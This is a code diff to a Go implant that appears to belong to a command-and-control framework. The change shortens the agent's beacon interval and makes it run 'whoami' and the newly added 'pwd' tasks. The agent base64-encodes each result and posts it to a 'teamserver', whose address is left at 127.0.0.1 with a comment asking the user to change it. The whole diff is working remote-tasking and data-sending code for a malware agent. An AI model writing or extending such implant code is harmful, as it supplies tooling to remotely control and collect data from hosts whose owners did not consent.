@@ -79,10 +79,11 @@ func main() {
 		return
 	}
 
+	// AGENT CONFIG (please change this)
 	agent := Agent{
 		IP:       "127.0.0.1",
 		Hostname: user.Username,
-		Sleep:    "5",
+		Sleep:    "2",
 		UID:      "",
 	}
 
@@ -192,7 +193,7 @@ func main() {
 			fmt.Println("[*] Found 'whoami', executing command")
 
 			command_id := task["CommandID"].(string)
-			result := b64_encode([]byte(user.Username))
+			result := b64_encode([]byte(whoami()))
 
 			result_struct := TaskResult{
 				CommandID: command_id,
@@ -208,6 +209,35 @@ func main() {
 
 			fmt.Println("[*] Sending results to teamserver...")
 			fmt.Println(string(jsonResult))
+			_, err = post_results(agent, PostResult, jsonResult, command_id)
+			if err != nil {
+				fmt.Println("[!] Error posting results")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Results sent successfully")
+
+		case "pwd":
+			fmt.Println("[*] Found 'pwd', executing command")
+			command_id := task["CommandID"].(string)
+			result := b64_encode([]byte(pwd()))
+
+			result_struct := TaskResult{
+				CommandID: command_id,
+				Result:    result,
+			}
+
+			jsonResult, err := json.Marshal(result_struct)
+			if err != nil {
+				fmt.Println("[!] Error marshalling result")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Sending results to teamserver...")
+			fmt.Println(string(jsonResult))
+
 			_, err = post_results(agent, PostResult, jsonResult, command_id)
 			if err != nil {
 				fmt.Println("[!] Error posting results")
